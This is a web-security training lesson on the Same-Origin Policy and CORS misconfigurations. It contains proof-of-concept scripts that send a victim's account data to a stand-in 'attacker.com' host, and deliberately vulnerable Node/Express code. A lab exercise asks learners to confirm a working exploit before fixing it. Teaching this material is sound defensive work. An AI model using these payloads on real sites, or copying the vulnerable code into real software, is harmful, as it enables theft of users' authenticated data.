---
title: "Same-Origin Policy and CORS"
tags: [foundation, web, SOP, CORS, same-origin-policy, preflight,
       misconfiguration, credential-exposure, attacker-mindset]
module: 01-Foundation-03
day: 19
related_topics:
  - HTTP Headers and Security Headers (Day 018)
  - Web Architecture Full Stack (Day 017)
  - XSS Fundamentals (Day 090)
  - CSRF Fundamentals (Day 096)
---

# Day 019 — Same-Origin Policy and CORS

## Goals

By the end of this lesson you will be able to:

1. State the Same-Origin Policy definition precisely — what makes two
   origins the same vs different.
2. Explain what SOP blocks and what it does not block.
3. Trace a CORS pre-flight request step-by-step.
4. Identify five CORS misconfiguration patterns that allow cross-origin
   credential theft.
5. Exploit a reflected-origin CORS misconfiguration with a minimal PoC.

---

## Prerequisites

- [Day 017 — Web Architecture Full Stack](DAY-0017-Web-Architecture-Full-Stack.md)
- [Day 018 — HTTP Headers and Security Headers](DAY-0018-HTTP-Headers-and-Security-Headers.md)

---

## Main Content — Part 1: Same-Origin Policy

### 1. The Rule

Two URLs have the **same origin** if and only if all three match:

| Component | URL A | URL B | Same? |
|---|---|---|---|
| **Scheme** | `https` | `https` | ✓ |
| **Host** | `app.example.com` | `app.example.com` | ✓ |
| **Port** | `443` (implicit) | `443` (implicit) | ✓ |

**Any one difference = different origin:**

| URL A | URL B | Reason different |
|---|---|---|
| `https://example.com` | `http://example.com` | Scheme differs |
| `https://example.com` | `https://api.example.com` | Host differs |
| `https://example.com` | `https://example.com:8443` | Port differs |
| `https://example.com/a` | `https://example.com/b` | Same origin (path ignored) |

---

### 2. What SOP Blocks and What It Doesn't

**SOP BLOCKS (cross-origin JavaScript reads):**
- `fetch()` / `XMLHttpRequest` response bodies from a different origin.
- DOM access to cross-origin iframes (`iframeEl.contentDocument`).
- Reading cookies, localStorage, sessionStorage from a different origin.

**SOP DOES NOT BLOCK (you must be aware of this):**
- Cross-origin `<img src>`, `<script src>`, `<link href>` — loading is
  allowed; reading the content is not.
- Form `POST` submissions to any origin (this is why CSRF exists).
- `<iframe>` embedding of a different origin (this is why X-Frame-Options
  exists).
- Cross-origin redirects — the browser follows them.

---

## Main Content — Part 2: CORS

### 3. Why CORS Exists

Modern web apps need JavaScript from `app.example.com` to call
`api.example.com`. SOP would block those `fetch()` responses. CORS is the
opt-in mechanism that allows servers to say: "I permit this cross-origin
request."

CORS is a server-side policy declared via response headers. The browser
enforces it. The server does not enforce it — other clients (curl, Postman)
are unaffected by CORS.

---

### 4. Simple vs Pre-flight Requests

**Simple request** (no pre-flight):
- Methods: GET, HEAD, POST.
- Content-Types: `text/plain`, `application/x-www-form-urlencoded`,
  `multipart/form-data`.
- No custom headers.

The browser sends the request directly and checks the CORS headers in
the response. If allowed, it gives the JS the response; if not, it
withholds it (but the request was still sent and processed by the server).

**Pre-flight (OPTIONS) request** — all other requests trigger this:
1. Browser sends `OPTIONS` request to the server.
2. Server responds with allowed methods, headers, and origins.
3. If the pre-flight passes, the browser sends the actual request.

```
OPTIONS /api/user HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

---

### 5. The Critical CORS Response Headers

| Header | Meaning | Dangerous value |
|---|---|---|
| `Access-Control-Allow-Origin` | Which origins may read the response | `*` (wildcard) or reflected origin |
| `Access-Control-Allow-Credentials` | Send cookies with cross-origin request | `true` |
| `Access-Control-Allow-Methods` | Allowed HTTP methods | `DELETE`, `PUT` in addition to GET |
| `Access-Control-Allow-Headers` | Allowed request headers | `Authorization` |

**The killer combination:**

```
Access-Control-Allow-Origin: https://attacker.com    ← reflected
Access-Control-Allow-Credentials: true
```

This means: a page at `https://attacker.com` can fetch the API response
including the user's cookies. This equals reading the victim's authenticated
data from the attacker's site.

---

## Main Content — Part 3: CORS Misconfigurations

### 6. Misconfiguration 1 — Reflected Origin

The most common misconfiguration. The server takes the `Origin` header
from the request and blindly reflects it.

**Vulnerable code (Node.js):**

```javascript
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', req.headers.origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    next();
});
```

**Attack:**

```html
<!-- Hosted on attacker.com -->
<script>
fetch('https://vulnerable-api.com/api/account', {
    credentials: 'include'   // sends victim's cookies
})
.then(r => r.json())
.then(data => {
    // Send victim's account data to attacker
    fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(data)));
});
</script>
```

**Detection:**

```bash
curl -s -I https://api.target.com/v1/me \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=legitimatetoken" | grep -i "access-control"

# Vulnerable response:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

---

### 7. Misconfiguration 2 — Wildcard with Credentials

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

The spec forbids this combination — browsers reject responses with both
`*` and `credentials: true`. However, some frameworks set `*` and
`Allow-Credentials: true` and then wonder why it doesn't work. The more
dangerous variant is when developers switch from `*` to reflected origin
to make credentials work — introducing the reflected-origin vulnerability.

---

### 8. Misconfiguration 3 — Prefix/Suffix Match

The developer tries to allow only subdomains but does a naive string check:

```javascript
// Vulnerable — checks if origin STARTS WITH the trusted domain
if (origin.startsWith('https://trusted.com')) {
    res.header('Access-Control-Allow-Origin', origin);
}
```

**Bypass:** Register `https://trusted.com.attacker.com` — it starts with
`https://trusted.com`.

Or the suffix check:

```javascript
// Vulnerable — checks if origin ENDS WITH
if (origin.endsWith('trusted.com')) {
    res.header('Access-Control-Allow-Origin', origin);
}
```

**Bypass:** Register `attackertrusted.com`.

---

### 9. Misconfiguration 4 — Null Origin

Some frameworks allow `null` as an origin (sent by sandboxed iframes and
local file requests):

```
Access-Control-Allow-Origin: null
```

**Attack:**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc="<script>
fetch('https://vulnerable.com/api/secret', {credentials:'include'})
.then(r=>r.text())
.then(d=>fetch('https://attacker.com/?d='+btoa(d)));
</script>">
</iframe>
```

The iframe's `Origin` header will be `null`, which matches the policy.

---

### 10. Misconfiguration 5 — Regex Escape Failure

A developer uses a regex to validate the origin but fails to escape
the `.` character:

```javascript
// Vulnerable: . matches any character
const allowed = /https:\/\/trusted.example.com/;
if (allowed.test(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
}
```

**Bypass:** `https://trustedXexample.com` matches because `.` in regex
means "any character."

---

## Key Takeaways

1. **SOP blocks JS reads, not requests.** A cross-origin form POST is not
   blocked by SOP — which is exactly why CSRF exists as a vulnerability class.
2. **CORS is opt-in by the server; enforced by the browser.** `curl` ignores
   CORS entirely. Server-side checks must not rely on CORS for access control.
3. **Reflected `Access-Control-Allow-Origin` + `Allow-Credentials: true`
   = direct credential theft.** This is a Critical/High severity finding in
   every bug bounty programme.
4. **Test CORS by sending a fake `Origin` header and inspecting the response.**
   A one-liner with `curl` detects this faster than any scanner.
5. **Wildcard `*` and credentials cannot coexist** (the browser blocks it) —
   but the attempt to "fix" this with reflected origin introduces a worse bug.

---

## Exercises

### Exercise 1 — CORS Test Script

Write a Bash script that:
1. Takes a target URL as input.
2. Sends requests with three different `Origin` values: a legitimate origin,
   `https://evil.com`, and `null`.
3. Reports whether each origin is reflected in the response.

### Exercise 2 — Exploit a Reflected-Origin CORS Lab

Set up a vulnerable Express server:

```javascript
const express = require('express');
const app = express();
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    next();
});
app.get('/api/secret', (req, res) => {
    // In real life this would check the session cookie
    res.json({ secret: 'your_bank_balance_is_9000' });
});
app.listen(3000);
```

Build the attacker HTML page that steals the secret and displays it to
you via `alert()`. Confirm the exploit works in the browser.

### Exercise 3 — Fix the Vulnerability

Fix the Express server from Exercise 2 with an explicit allowlist:

```javascript
const ALLOWED_ORIGINS = ['https://app.example.com', 'https://www.example.com'];
app.use((req, res, next) => {
    const origin = req.headers.origin;
    if (ALLOWED_ORIGINS.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Vary', 'Origin');  // Tell caches this header varies
    }
    next();
});
```

Re-run the exploit — confirm it no longer works.

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 018 — HTTP Headers and Security Headers](DAY-0018-HTTP-Headers-and-Security-Headers.md)*
*Next: [Day 020 — REST APIs, JSON and GraphQL](DAY-0020-REST-APIs-JSON-and-GraphQL.md)*
